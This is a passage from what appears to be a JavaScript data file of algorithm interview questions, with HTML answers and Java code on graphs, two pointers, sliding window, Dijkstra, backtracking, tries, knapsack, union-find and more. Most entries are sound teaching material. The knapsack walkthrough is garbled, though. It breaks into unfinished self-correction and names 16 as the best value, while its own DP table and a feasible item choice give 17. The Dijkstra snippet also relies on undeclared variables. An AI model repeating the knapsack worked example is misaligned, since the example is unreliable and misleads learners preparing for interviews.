        if (!visited.contains(neighbor)) {
            dfs(neighbor, visited);
        }
    }
}</pre>
<table><tr><th>Feature</th><th>BFS</th><th>DFS</th></tr>
<tr><td>Data structure</td><td>Queue</td><td>Stack / Recursion</td></tr>
<tr><td>Finds shortest path?</td><td>Yes (unweighted)</td><td>No</td></tr>
<tr><td>Memory</td><td>Higher (stores entire level)</td><td>Lower</td></tr>
<tr><td>Use case</td><td>Shortest path, level-order</td><td>Cycle detection, topological sort</td></tr></table>
<div class="key-point">Use <strong>BFS</strong> for "shortest path" or "minimum steps" problems. Use <strong>DFS</strong> for "explore all paths", "detect cycles", or when solutions are deep in the graph.</div>`,
      },
      {
        q: 'What is the Two Pointer technique?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Two pointers collapses an O(n²) brute force into O(n) by walking two indices instead of nesting loops. Two common shapes: opposite ends converging (find a pair summing to a target in a sorted array, or palindrome checks) and fast/slow same-direction (cycle detection, or the read/write pointer pattern for in-place dedup and partitioning). The precondition for the converging variant is usually a sorted array, which is the cue to reach for it. It's the go-to when a naive solution compares all pairs but the structure lets you eliminate half the possibilities each step. Its close cousin is the sliding window — two pointers moving the same direction to maintain a range.</p></div>
<p><strong>Two Pointers</strong> = use two indices that move through an array, usually from both ends or at different speeds, to solve problems in O(n).</p>
<p><strong>Analogy:</strong> Two people searching a hallway of lockers — one starts from the left, one from the right. They walk toward each other and meet in the middle.</p>
<p><strong>Example 1: Two Sum (sorted array)</strong></p>
<pre>Find two numbers that add to 9 in [1, 2, 4, 6, 8, 10]:

left = 0 (value 1), right = 5 (value 10)
  1 + 10 = 11 > 9 → move right ← 
  1 + 8 = 9 → FOUND! ✅

// O(n) instead of O(n²) brute force!</pre>
<p><strong>Example 2: Remove duplicates from sorted array</strong></p>
<pre>[1, 1, 2, 2, 3] → [1, 2, 3, _, _]

slow = 0, fast = 1
  fast=1: arr[1]==arr[0], skip
  fast=2: arr[2]!=arr[1], slow++, arr[slow]=arr[fast] → [1,2,2,2,3]
  fast=3: arr[3]==arr[2], skip
  fast=4: arr[4]!=arr[3], slow++, arr[slow]=arr[fast] → [1,2,3,2,3]
Result: first 3 elements = [1, 2, 3] ✅</pre>
<p><strong>Example 3: Is Palindrome?</strong></p>
<pre>"racecar": left='r', right='r' ✅ → left='a', right='a' ✅ → ... → palindrome!</pre>
<p><strong>Patterns:</strong></p>
<ul>
<li><strong>Opposite ends</strong>: Left at start, right at end (two sum, palindrome, container with most water)</li>
<li><strong>Same direction</strong>: Slow and fast pointer (remove duplicates, fast/slow linked list cycle)</li>
</ul>
<div class="key-point">Two pointers usually reduce O(n²) to O(n). Works best on <strong>sorted arrays</strong> or when you need to compare elements from both ends.</div>`,
      },
      {
        q: 'What is the Sliding Window technique?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Sliding window turns a repeated recomputation over every subarray or substring into O(n) by maintaining a running window and updating it incrementally as it moves, instead of recomputing from scratch. Two flavors: fixed-size (max sum of k consecutive elements — slide by adding the new element and dropping the old) and variable-size (longest substring without repeating characters — expand the right edge, shrink the left when a constraint breaks). The tell is a problem about a contiguous subarray or substring plus an optimization or constraint. It usually pairs with a hash map or counter to track window contents. The gotcha is shrinking the window correctly — knowing exactly when and how far to advance the left pointer is where the bugs live.</p></div>
<p><strong>Sliding Window</strong> = maintain a "window" (subarray/substring) that expands or shrinks as you move through the array. Avoids recomputing from scratch each time.</p>
<p><strong>Analogy:</strong> A magnifying glass sliding over a book page. You can see a fixed-size chunk of text at a time. As you slide it right, you lose one character from the left and gain one from the right.</p>
<p><strong>Example 1: Maximum sum of subarray of size K</strong></p>
<pre>Array: [2, 1, 5, 1, 3, 2], K = 3
Find max sum of 3 consecutive elements.

Brute force: Calculate sum of EVERY subarray of size 3 → O(n*k)

Sliding Window: 
  Window [2,1,5] sum = 8
  Slide: remove 2, add 1 → [1,5,1] sum = 8 - 2 + 1 = 7
  Slide: remove 1, add 3 → [5,1,3] sum = 7 - 1 + 3 = 9 ✅ (max!)
  Slide: remove 5, add 2 → [1,3,2] sum = 9 - 5 + 2 = 6
→ O(n)!</pre>
<pre>// Java: Max sum subarray of size k
int maxSum(int[] arr, int k) {
    int windowSum = 0, maxSum = 0;
    for (int i = 0; i < arr.length; i++) {
        windowSum += arr[i];            // add right element
        if (i >= k) windowSum -= arr[i - k]; // remove left element
        if (i >= k - 1) maxSum = Math.max(maxSum, windowSum);
    }
    return maxSum;
}</pre>
<p><strong>Two types:</strong></p>
<ul>
<li><strong>Fixed-size window</strong>: Window always has K elements (max sum subarray)</li>
<li><strong>Variable-size window</strong>: Expand right, shrink left based on condition (longest substring without repeating chars)</li>
</ul>
<div class="key-point">Sliding window turns O(n*k) or O(n²) into O(n). Look for keywords: "contiguous subarray", "substring", "window of size K".</div>`,
      },
      {
        q: 'How does a Graph work? Adjacency List vs Adjacency Matrix.',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>A graph is nodes plus edges, and the first real decision is representation, driven by density. An adjacency list — each vertex holds its neighbors — uses O(V+E) space and is the right default for the sparse graphs you see in practice, with fast neighbor iteration. An adjacency matrix is a V×V grid: O(V²) space regardless of edges but O(1) edge lookup, so it only pays off for dense graphs or when you constantly test "is there an edge between u and v." I also clarify directed vs undirected and weighted vs unweighted early, because those decide which algorithms apply. The gotcha is a matrix blowing up memory on a large sparse graph — a million vertices is a trillion-cell matrix.</p></div>
<p>A <strong>Graph</strong> is a collection of nodes (vertices) connected by edges. It models relationships: social networks, roads, web pages, dependencies.</p>
<p><strong>Types:</strong></p>
<ul>
<li><strong>Directed</strong>: Edges have direction (Twitter follow: A→B doesn't mean B→A)</li>
<li><strong>Undirected</strong>: Edges go both ways (Facebook friendship: mutual)</li>
<li><strong>Weighted</strong>: Edges have values (road distances, flight costs)</li>
</ul>
<p><strong>Two ways to store a graph:</strong></p>
<pre>Graph: 0--1--2
       |     |
       3-----+

Adjacency List (most common):
  0: [1, 3]
  1: [0, 2]
  2: [1, 3]
  3: [0, 2]

Adjacency Matrix:
     0  1  2  3
  0 [0, 1, 0, 1]
  1 [1, 0, 1, 0]
  2 [0, 1, 0, 1]
  3 [1, 0, 1, 0]</pre>
<table><tr><th>Operation</th><th>Adjacency List</th><th>Adjacency Matrix</th></tr>
<tr><td>Space</td><td>O(V + E) ✅</td><td>O(V²)</td></tr>
<tr><td>Check if edge exists</td><td>O(degree)</td><td>O(1) ✅</td></tr>
<tr><td>Find all neighbors</td><td>O(degree) ✅</td><td>O(V)</td></tr>
<tr><td>Best for</td><td>Sparse graphs</td><td>Dense graphs</td></tr></table>
<pre>// Java: Adjacency List
Map&lt;Integer, List&lt;Integer&gt;&gt; graph = new HashMap&lt;&gt;();
graph.put(0, Arrays.asList(1, 3));
graph.put(1, Arrays.asList(0, 2));
// etc.</pre>
<div class="key-point">Most real-world graphs are <strong>sparse</strong> (few edges relative to nodes), so <strong>adjacency list</strong> is the default choice. Use adjacency matrix only for small, dense graphs.</div>`,
      },
      {
        q: "What is Dijkstra's Algorithm?",
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Dijkstra finds single-source shortest paths in a graph with non-negative weights by greedily expanding the closest unvisited node, using a min-heap to always pull the current nearest — that gives O((V+E) log V). The greedy choice is only valid because weights are non-negative; the single most important thing to say is that Dijkstra breaks on negative edges, where you switch to Bellman-Ford (O(VE), and it detects negative cycles). If you have a heuristic toward a specific target, A* is Dijkstra plus that heuristic and is faster in practice. For unweighted graphs, plain BFS is the right tool. The classic implementation gotcha is using a lazy-deletion heap — push duplicates, skip stale entries — rather than a decrease-key operation.</p></div>
<p><strong>Dijkstra's Algorithm</strong> finds the <strong>shortest path</strong> from a source node to all other nodes in a <strong>weighted graph</strong> (non-negative weights).</p>
<p><strong>Analogy:</strong> You're at a city (node A) and want the shortest route to every other city. You start by visiting the nearest city first, then update distances to its neighbors. Always visit the unvisited city with the smallest known distance.</p>
<pre>Graph:
  A --1-- B --3-- D
  |       |       |
  4       2       1
  |       |       |
  C --5-- E --2-- F

Dijkstra from A:
  Start: dist = {A:0, B:∞, C:∞, D:∞, E:∞, F:∞}
  
  Visit A(0): Update B=1, C=4
  Visit B(1): Update D=4, E=3
  Visit E(3): Update C=min(4,8)=4, F=5
  Visit C(4): no improvement
  Visit D(4): Update F=min(5,5)=5
  Visit F(5): done

  Shortest paths from A: {A:0, B:1, C:4, D:4, E:3, F:5}</pre>
<pre>// Java: Dijkstra with Priority Queue
void dijkstra(int[][] graph, int src) {
    int[] dist = new int[n];
    Arrays.fill(dist, Integer.MAX_VALUE);
    dist[src] = 0;
    PriorityQueue&lt;int[]&gt; pq = new PriorityQueue&lt;&gt;((a,b) -> a[1]-b[1]);
    pq.add(new int[]{src, 0});
    
    while (!pq.isEmpty()) {
        int[] curr = pq.poll();
        int u = curr[0], d = curr[1];
        if (d > dist[u]) continue; // already found shorter
        for (int[] neighbor : adj.get(u)) {
            int v = neighbor[0], w = neighbor[1];
            if (dist[u] + w < dist[v]) {
                dist[v] = dist[u] + w;
                pq.add(new int[]{v, dist[v]});
            }
        }
    }
}</pre>
<p><strong>Time:</strong> O((V + E) log V) with priority queue.</p>
<div class="key-point">Dijkstra <strong>does NOT work</strong> with negative edge weights. For negative weights, use <strong>Bellman-Ford</strong>. Google Maps uses a variant of Dijkstra to find shortest routes.</div>`,
      },
      {
        q: 'What is the Greedy Algorithm approach?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Greedy makes the locally optimal choice at each step and never reconsiders, which is fast and simple — but the whole game is proving it actually yields the global optimum, because for most problems it doesn't. It only works when the problem has the greedy-choice property and optimal substructure; the canonical wins are interval scheduling, Huffman coding, Dijkstra, and minimum spanning trees. The classic trap is coin change: greedy works for standard denominations but fails for arbitrary ones, where you need DP. So in an interview my instinct is to try greedy, then immediately look for a counterexample — if I can't prove it or break it, I fall back to DP. Greedy is a hypothesis, not a default.</p></div>
<p>A <strong>Greedy Algorithm</strong> makes the <strong>locally optimal choice</strong> at each step, hoping it leads to the globally optimal solution.</p>
<p><strong>Analogy:</strong> Climbing a mountain in fog. You can only see a few meters ahead. At each step, you walk in the direction that goes UP the most. This doesn't always get you to the highest peak, but for many problems, it works perfectly.</p>
<p><strong>Example 1: Coin Change (Greedy works here)</strong></p>
<pre>Make change for 36 cents using fewest coins [25, 10, 5, 1]:
  Greedy: Take largest coin first
  25 → remaining 11
  10 → remaining 1
  1  → remaining 0
  Answer: 3 coins [25, 10, 1] ✅</pre>
<p><strong>Example 2: Activity Selection</strong></p>
<pre>Select max non-overlapping activities:
  Activities: [(1,3), (2,5), (3,4), (5,7), (6,8)]
  
  Greedy: Sort by end time, pick earliest ending activity
  Pick (1,3) → Pick (3,4) → Skip (2,5) overlaps → Pick (5,7) → Skip (6,8)
  Answer: 3 activities [(1,3), (3,4), (5,7)] ✅</pre>
<p><strong>When greedy works:</strong></p>
<ul>
<li>Problem has <strong>greedy-choice property</strong>: local optimal → global optimal</li>
<li>Fractional knapsack, Huffman coding, Dijkstra's, minimum spanning tree</li>
</ul>
<p><strong>When greedy FAILS:</strong></p>
<pre>Coins [1, 3, 4], amount = 6:
  Greedy: 4 + 1 + 1 = 3 coins
  Optimal: 3 + 3 = 2 coins ← greedy fails! Need DP instead.</pre>
<div class="key-point">Greedy is <strong>fast and simple</strong> but doesn't always give the optimal answer. If greedy doesn't work, try <strong>Dynamic Programming</strong>.</div>`,
      },
      {
        q: 'What is Backtracking?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Backtracking is systematic brute force over a decision tree: you build a candidate incrementally, and the moment a partial solution can't possibly work you prune that whole branch and undo the last choice — that pruning is what separates it from naive exhaustive search. It's the tool for constraint-satisfaction and combinatorial problems: permutations, combinations, subsets, N-Queens, Sudoku, word search. The template is choose, explore, un-choose — recurse, then undo state. It's still exponential in the worst case, so the art is strong pruning and good constraint checks to cut the search space early. The gotcha is forgetting to undo the choice on the way back up, which corrupts state for sibling branches.</p></div>
<p><strong>Backtracking</strong> = try all possible options, and when you hit a dead end, undo the last choice and try a different path. It's like solving a maze — if you hit a wall, go back and try another turn.</p>
<p><strong>Analogy:</strong> Trying combinations on a lock. Try 000, 001, 002... If you know the first digit is 3 (constraint), you skip 000-299 entirely. That's the power of backtracking — <strong>pruning</strong> bad choices early.</p>
<p><strong>Example: Generate all permutations of [1, 2, 3]</strong></p>
<pre>                 []
          /      |      \\
        [1]     [2]     [3]
       /   \\   /   \\   /   \\
    [1,2] [1,3] [2,1] [2,3] [3,1] [3,2]
      |     |     |     |     |     |
  [1,2,3] [1,3,2] [2,1,3] [2,3,1] [3,1,2] [3,2,1]</pre>
<pre>// Java: Permutations
void permute(int[] nums, List&lt;Integer&gt; current, boolean[] used, List&lt;List&lt;Integer&gt;&gt; result) {
    if (current.size() == nums.length) {
        result.add(new ArrayList&lt;&gt;(current));
        return;
    }
    for (int i = 0; i < nums.length; i++) {
        if (used[i]) continue;       // skip if already used
        used[i] = true;              // choose
        current.add(nums[i]);
        permute(nums, current, used, result); // explore
        current.remove(current.size() - 1);   // un-choose (backtrack!)
        used[i] = false;
    }
}</pre>
<p><strong>Classic backtracking problems:</strong></p>
<ul>
<li>N-Queens: Place N queens on a chessboard so none attack each other</li>
<li>Sudoku solver: Try numbers 1-9, backtrack if conflict</li>
<li>Subsets, Combinations, Permutations</li>
<li>Word search in a grid</li>
</ul>
<div class="key-point">Backtracking template: <strong>Choose → Explore → Un-choose</strong>. The "un-choose" step is what makes it backtracking. Always add <strong>pruning conditions</strong> to skip obviously bad paths.</div>`,
      },
      {
        q: 'What is the difference between Stable and Unstable sorting?',
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>A stable sort keeps equal elements in their original relative order; an unstable one may reorder them. It sounds academic until you do multi-key sorting: sort by name, then by department, and stability is what preserves the name order within each department — that's the practical reason it matters, and why databases and spreadsheets need stable sorts. Merge sort and insertion sort are stable; quicksort and heapsort are not in their standard forms. That's exactly why Java uses Timsort (stable, merge-based) for objects but a dual-pivot quicksort for primitives, where stability is meaningless since equal ints are indistinguishable. You can always make an unstable sort stable by adding the original index as a tiebreaker, at some cost.</p></div>
<p>A <strong>stable</strong> sort preserves the relative order of equal elements. An <strong>unstable</strong> sort doesn't guarantee it.</p>
<p><strong>Analogy:</strong> You have a list of students sorted by name. Now sort by grade. With a <strong>stable</strong> sort, students with the same grade remain alphabetically ordered. With an unstable sort, their name order might get shuffled.</p>
<pre>Original (sorted by name):
  Alice: B
  Bob: A
  Charlie: B
  David: A

Stable sort by grade:
  Bob: A      ← David after Bob (original order preserved)
  David: A
  Alice: B    ← Charlie after Alice (original order preserved)
  Charlie: B

Unstable sort by grade:
  David: A    ← order of A's might be swapped!
  Bob: A
  Charlie: B  ← order of B's might be swapped!
  Alice: B</pre>
<table><tr><th>Stable Sorts</th><th>Unstable Sorts</th></tr>
<tr><td>Merge Sort</td><td>Quick Sort</td></tr>
<tr><td>Insertion Sort</td><td>Heap Sort</td></tr>
<tr><td>Bubble Sort</td><td>Selection Sort</td></tr>
<tr><td>Timsort (Java/Python)</td><td></td></tr></table>
<div class="key-point">Stability matters when you sort by multiple criteria (e.g., sort by date, then by priority). Java's <code>Arrays.sort()</code> uses <strong>Timsort (stable)</strong> for objects and <strong>Dual-Pivot Quicksort (unstable)</strong> for primitives.</div>`,
      },
      {
        q: 'How do you detect a cycle in a Linked List?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Floyd's tortoise-and-hare is the elegant answer: two pointers, slow moving one step and fast moving two; if there's a cycle they must eventually meet inside it, and if fast hits null there's no cycle. The beauty is O(n) time and O(1) space — no hash set of visited nodes, which is the naive alternative. The follow-up that trips people up is finding the cycle's start: after they meet, reset one pointer to the head and advance both one step at a time, and they meet at the entry — a neat number-theory result about the distances. I'd mention the hash-set approach too, since it's simpler to reason about and generalizes, but Floyd's wins on space and is what they're fishing for.</p></div>
<p>Use <strong>Floyd's Tortoise and Hare</strong> algorithm: two pointers, one moves 1 step (slow), the other moves 2 steps (fast). If there's a cycle, they'll eventually meet.</p>
<p><strong>Analogy:</strong> Two runners on a circular track. The fast runner laps the slow runner — they MUST meet. On a straight track (no cycle), the fast runner just reaches the end.</p>
<pre>Linked List with cycle:
  1 → 2 → 3 → 4 → 5
              ↑       ↓
              8 ← 7 ← 6

Step 1: slow=1, fast=1
Step 2: slow=2, fast=3
Step 3: slow=3, fast=5
Step 4: slow=4, fast=7
Step 5: slow=5, fast=3
Step 6: slow=6, fast=5
Step 7: slow=7, fast=7 → MEET! Cycle detected! ✅</pre>
<pre>// Java: Floyd's Cycle Detection
boolean hasCycle(ListNode head) {
    ListNode slow = head, fast = head;
    while (fast != null && fast.next != null) {
        slow = slow.next;         // 1 step
        fast = fast.next.next;    // 2 steps
        if (slow == fast) return true;  // they met → cycle!
    }
    return false;  // fast reached end → no cycle
}

// Find WHERE the cycle starts:
ListNode findCycleStart(ListNode head) {
    ListNode slow = head, fast = head;
    while (fast != null && fast.next != null) {
        slow = slow.next;
        fast = fast.next.next;
        if (slow == fast) {
            slow = head;  // reset slow to head
            while (slow != fast) {  // move both 1 step
                slow = slow.next;
                fast = fast.next;
            }
            return slow;  // meeting point = cycle start
        }
    }
    return null;
}</pre>
<div class="key-point">Time: O(n), Space: O(1). This is much better than using a HashSet (O(n) space). Floyd's algorithm is a classic interview question!</div>`,
      },
      {
        q: 'What is a Trie (Prefix Tree) and when is it used?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>A trie stores strings by sharing prefixes — each node is a character and a root-to-node path spells a string — so lookup and insert are O(L) in the key length, independent of how many words you've stored, which beats a hash map for prefix work. Its killer feature is prefix queries: autocomplete, spell-check, and "all words starting with..." are trivial, which a hash map simply can't do. The tradeoff is memory — a naive trie with 26 (or 256) child pointers per node is wasteful — so in practice you use a map per node, or compress to a radix/Patricia trie. It powers autocomplete and IP routing tables. The gotcha is that for pure exact-match lookups a hash map is usually simpler and lighter.</p></div>
<p>A <strong>Trie</strong> is a tree-like data structure for storing strings where each node represents a character. It's extremely fast for prefix-based lookups.</p>
<p><strong>Analogy:</strong> A dictionary organized letter by letter. To find "cat", go to 'c', then 'a', then 't'. To find all words starting with "ca", follow 'c' → 'a' and you immediately see all options.</p>
<pre>Trie storing ["cat", "car", "card", "dog"]:

        root
       /    \\
      c      d
      |      |
      a      o
     / \\     |
    t*  r*   g*
        |
        d*
  (* = end of word)

Search "car": c→a→r (found, marked as word ✅)
Search "ca":  c→a (found prefix, but not a complete word)
Prefix "ca":  Follow c→a → find all children: "cat", "car", "card"</pre>
<pre>// Java: Trie implementation
class TrieNode {
    TrieNode[] children = new TrieNode[26];
    boolean isWord = false;
}

class Trie {
    TrieNode root = new TrieNode();
    
    void insert(String word) {
        TrieNode node = root;
        for (char c : word.toCharArray()) {
            if (node.children[c - 'a'] == null)
                node.children[c - 'a'] = new TrieNode();
            node = node.children[c - 'a'];
        }
        node.isWord = true;
    }
    
    boolean search(String word) {
        TrieNode node = find(word);
        return node != null && node.isWord;
    }
    
    boolean startsWith(String prefix) {
        return find(prefix) != null;
    }
}</pre>
<p><strong>Use cases:</strong></p>
<ul>
<li><strong>Autocomplete</strong>: "Type 'goo' → suggest google, good, goose"</li>
<li><strong>Spell checker</strong>: Check if a word exists quickly</li>
<li><strong>IP routing</strong>: Longest prefix matching</li>
<li><strong>Word games</strong>: Boggle, Scrabble word validation</li>
</ul>
<div class="key-point">Trie search is <strong>O(L)</strong> where L is length of the word — independent of how many words are stored! Much faster than HashSet for prefix queries.</div>`,
      },
      {
        q: 'What is the Knapsack Problem?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Knapsack is the archetypal DP: maximize value under a weight budget. The key distinction is 0/1 (each item taken once) versus unbounded (unlimited copies), because it changes the recurrence and the loop direction. For 0/1 the state is dp[i][w] = best value using the first i items within capacity w, and the space-optimized trick is a 1D array iterated backwards so you don't reuse an item. The crucial gotcha to name is that it's only "polynomial" in the pseudo sense — O(n·W), where W is a numeric value, not the input size, so it's actually exponential in the bit-length of W, which is why knapsack is NP-hard. Greedy by value/weight ratio solves fractional knapsack but not 0/1.</p></div>
<p>The <strong>Knapsack Problem</strong>: Given items with weights and values, select items to maximize total value without exceeding a weight limit.</p>
<p><strong>Analogy:</strong> You're packing for a hike with a backpack that holds 10kg. You have a tent (3kg, value 5), sleeping bag (4kg, value 7), food (5kg, value 8), camera (2kg, value 4). What do you take to maximize usefulness?</p>
<p><strong>0/1 Knapsack (can't split items):</strong></p>
<pre>Items: [{weight:3, value:5}, {weight:4, value:7}, 
        {weight:5, value:8}, {weight:2, value:4}]
Capacity: 10kg

Brute force: Try all combinations (2ⁿ) → too slow!

DP approach: Build a table
     weight →  0  1  2  3  4  5  6  7  8  9  10
item 0 (3,5):  0  0  0  5  5  5  5  5  5  5   5
item 1 (4,7):  0  0  0  5  7  7  7  12 12 12  12
item 2 (5,8):  0  0  0  5  7  8  8  12 13 15  15
item 3 (2,4):  0  0  4  5  7  9  11 12 12 16  17

Answer: 17 (take items: sleeping bag + food + camera = 4+5+2=11... 
             actually: 5+7+4+... let me recalculate)
Best: sleeping bag(7) + food(8) + camera(4) = 19? weight = 4+5+2 = 11 > 10
Take: tent(5) + sleeping bag(7) + camera(4) = 16, weight = 3+4+2 = 9 ✅</pre>
<pre>// Java: 0/1 Knapsack DP
int knapsack(int[] weights, int[] values, int capacity) {
    int n = weights.length;
    int[][] dp = new int[n + 1][capacity + 1];
    for (int i = 1; i <= n; i++) {
        for (int w = 0; w <= capacity; w++) {
            dp[i][w] = dp[i-1][w]; // don't take item i
            if (weights[i-1] <= w)
                dp[i][w] = Math.max(dp[i][w], 
                    dp[i-1][w - weights[i-1]] + values[i-1]); // take it
        }
    }
    return dp[n][capacity];
}</pre>
<div class="key-point">0/1 Knapsack is a classic <strong>DP problem</strong>: O(n × capacity). Variations: Unbounded Knapsack (unlimited copies), Fractional Knapsack (can split items — use Greedy).</div>`,
      },
      {
        q: 'What is Topological Sort?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Topological sort linearizes a DAG so every edge points forward — it's the answer to any "ordering with dependencies" problem: build systems, task scheduling, course prerequisites, package resolution. Two standard implementations: Kahn's algorithm (BFS on in-degrees, repeatedly removing zero-incoming nodes) and DFS with a finish-time stack, both O(V+E). The most important property to state is that it only exists if the graph is acyclic, so topological sort doubles as cycle detection — if you can't produce a full ordering (Kahn's leaves nodes with nonzero in-degree), there's a cycle, which is exactly how build tools catch circular dependencies. The order isn't unique unless the DAG is a single chain.</p></div>
<p><strong>Topological Sort</strong> orders nodes in a <strong>directed acyclic graph (DAG)</strong> such that for every edge A→B, A comes before B.</p>
<p><strong>Analogy:</strong> Getting dressed. You must put on underwear before pants, socks before shoes. There's a dependency order. Topological sort gives you a valid order to get dressed.</p>
<pre>Dependencies:
  underwear → pants → belt
  shirt → belt → jacket
  socks → shoes
  pants → shoes

Topological Sort: underwear, socks, shirt, pants, belt, shoes, jacket
(Any valid order where dependencies come first)</pre>
<pre>Graph:
  A → B → D
  A → C → D

Topological order: A, B, C, D (or A, C, B, D) — both valid</pre>
<pre>// Java: Topological Sort using BFS (Kahn's Algorithm)
List&lt;Integer&gt; topologicalSort(int n, List&lt;List&lt;Integer&gt;&gt; adj) {
    int[] inDegree = new int[n];
    for (int u = 0; u < n; u++)
        for (int v : adj.get(u)) inDegree[v]++;
    
    Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();
    for (int i = 0; i < n; i++)
        if (inDegree[i] == 0) queue.add(i); // no dependencies
    
    List&lt;Integer&gt; order = new ArrayList&lt;&gt;();
    while (!queue.isEmpty()) {
        int u = queue.poll();
        order.add(u);
        for (int v : adj.get(u)) {
            if (--inDegree[v] == 0) queue.add(v);
        }
    }
    return order.size() == n ? order : null; // null = has cycle!
}</pre>
<p><strong>Use cases:</strong></p>
<ul>
<li>Build systems (compile A before B)</li>
<li>Task scheduling with dependencies</li>
<li>Course prerequisite ordering</li>
<li>Package dependency resolution (npm, Maven)</li>
</ul>
<div class="key-point">Topological sort only works on <strong>DAGs</strong> (directed graphs with no cycles). If there's a cycle, no valid ordering exists. Kahn's algorithm detects cycles: if result size < n, there's a cycle.</div>`,
      },
      {
        q: 'What is the Union-Find (Disjoint Set) data structure?',
        difficulty: 'hard',
        a: `<div class="interview-answer"><p>Union-Find (disjoint set) tracks a partition into groups and answers "are these two in the same set?" and "merge these two sets" in nearly O(1). The magic is the two optimizations together: path compression (flatten the tree on find) and union by rank or size (attach the smaller tree under the larger), which give an amortized inverse-Ackermann cost — effectively constant. It's the natural fit for dynamic connectivity: Kruskal's MST, detecting cycles in an undirected graph, counting connected components, and equivalence grouping. The tell in an interview is "group these" or "are these connected" with incremental unions. The gotcha is that it handles unions well but not splits — it's not designed for disconnecting.</p></div>
<p><strong>Union-Find</strong> tracks a collection of elements partitioned into disjoint (non-overlapping) sets. It supports two operations efficiently: <strong>Find</strong> (which set does this element belong to?) and <strong>Union</strong> (merge two sets).</p>
<p><strong>Analogy:</strong> Social groups at a party. Each group has a leader. When two groups decide to merge, one leader becomes the new leader. To check if two people are in the same group, check if they have the same leader.</p>
<pre>Initially: Each person is their own group
  {A} {B} {C} {D} {E}

Union(A, B): A and B in same group → {A,B} {C} {D} {E}
Union(C, D): → {A,B} {C,D} {E}
Union(B, D): merge groups → {A,B,C,D} {E}
Find(A) == Find(C)? → YES, same group ✅
Find(A) == Find(E)? → NO, different groups ❌</pre>
<pre>// Java: Union-Find with path compression + union by rank
class UnionFind {
    int[] parent, rank;
    
    UnionFind(int n) {
        parent = new int[n];
        rank = new int[n];
        for (int i = 0; i < n; i++) parent[i] = i; // each is own parent
    }
    
    int find(int x) {
        if (parent[x] != x)
            parent[x] = find(parent[x]); // path compression!
        return parent[x];
    }
    
    void union(int x, int y) {
        int px = find(x), py = find(y);
        if (px == py) return; // already same group
        if (rank[px] < rank[py]) parent[px] = py;      // union by rank
        else if (rank[px] > rank[py]) parent[py] = px;
        else { parent[py] = px; rank[px]++; }
    }
    
    boolean connected(int x, int y) {
        return find(x) == find(y);
    }
}</pre>
<p><strong>Use cases:</strong></p>
<ul>
<li>Detect cycle in undirected graph</li>
<li>Kruskal's minimum spanning tree</li>
<li>Connected components (number of islands)</li>
<li>Network connectivity</li>
</ul>
<div class="key-point">With path compression + union by rank, both Find and Union are nearly <strong>O(1)</strong> — technically O(α(n)) which is ≤ 4 for any practical input size.</div>`,
      },
      {
        q: "How do you solve the 'Two Sum' problem?",
        difficulty: 'easy',
        a: `<div class="interview-answer"><p>Two Sum is the canonical "hash map beats brute force" problem. The naive nested loop is O(n²); the trick is a single pass with a hash map of value to index, and for each element you check whether target minus it is already in the map — O(n) time, O(n) space. The insight I'd articulate is trading space for time by remembering what you've seen. If the array were sorted, the alternative is two pointers converging from both ends, O(n) time and O(1) space but O(n log n) to sort first, so which is "better" depends on whether it's pre-sorted. The gotchas the interviewer is probing are handling duplicates, not using the same element twice, and returning indices versus values.</p></div>
<p><strong>Problem:</strong> Given an array and a target, find two numbers that add up to the target. Return their indices.</p>
<p><strong>Analogy:</strong> You have a jar of numbered balls. You pick one ball and ask: "Is there another ball that, together, adds up to the target?" Instead of checking every pair (slow), you remember what you've already seen.</p>
<pre>Array: [2, 7, 11, 15], Target: 9

Brute Force O(n²):
  Check every pair: (2,7)=9 ✅ found!
  But slow for large arrays.

HashMap O(n):
  For each number, check if (target - number) exists in the map.
  
  num=2: need 9-2=7, map={} → not found, store {2:0}
  num=7: need 9-7=2, map={2:0} → FOUND! ✅ indices [0, 1]</pre>
<pre>// Java: Two Sum with HashMap
int[] twoSum(int[] nums, int target) {
    Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;();
    for (int i = 0; i < nums.length; i++) {
        int complement = target - nums[i];
        if (map.containsKey(complement)) {
            return new int[]{map.get(complement), i};
        }
        map.put(nums[i], i);
    }
    return new int[]{};
}

// If array is SORTED → use Two Pointers instead:
int left = 0, right = arr.length - 1;
while (left < right) {
    int sum = arr[left] + arr[right];
    if (sum == target) return new int[]{left, right};
    else if (sum < target) left++;
    else right--;
}</pre>
<div class="key-point">"Two Sum" is the <strong>#1 most asked interview question</strong> (LeetCode #1). The HashMap approach trades space for time: O(n) time, O(n) space. It's a pattern: when you need to find a complement, use a HashMap.</div>`,
      },
      {
        q: 'What is Bit Manipulation and common bitwise tricks?',
        difficulty: 'medium',
        a: `<div class="interview-answer"><p>Bit manipulation works directly on the binary representation, and it's worth knowing a handful of idioms cold: <code>x &amp; 1</code> for odd/even, <code>x &amp; (x-1)</code> clears the lowest set bit (so it counts set bits and tests power-of-two), XOR for toggling and finding the single unpaired element since <code>a ^ a = 0</code>, and shifts for fast multiply or divide by powers of two. Bitmasks are the practical payoff: representing a set of up to about 64 elements in one integer, the backbone of bitmask DP for subset problems. The gotchas I'd flag are signedness and arithmetic vs logical right shift, operator precedence (bitwise ops bind loosely, so parenthesize), and undefined behavior shifting by the full width. Great for micro-optimization, but don't trade away readability without cause.</p></div>
<p><strong>Bit Manipulation</strong> = working directly with binary representations of numbers. Extremely fast and memory-efficient.</p>
<p><strong>Analogy:</strong> Normal math uses decimal (base 10). Computers think in binary (base 10 → base 2). Bit manipulation is "speaking the computer's native language".</p>
<pre>Basic operators:
  AND (&):  1010 & 1100 = 1000  (both bits must be 1)
  OR  (|):  1010 | 1100 = 1110  (either bit is 1)
  XOR (^):  1010 ^ 1100 = 0110  (bits are different)
  NOT (~):  ~1010 = 0101        (flip all bits)
  LEFT SHIFT (<<):  0001 << 2 = 0100  (multiply by 2^n)
  RIGHT SHIFT (>>): 1000 >> 2 = 0010  (divide by 2^n)</pre>
<p><strong>Common tricks:</strong></p>
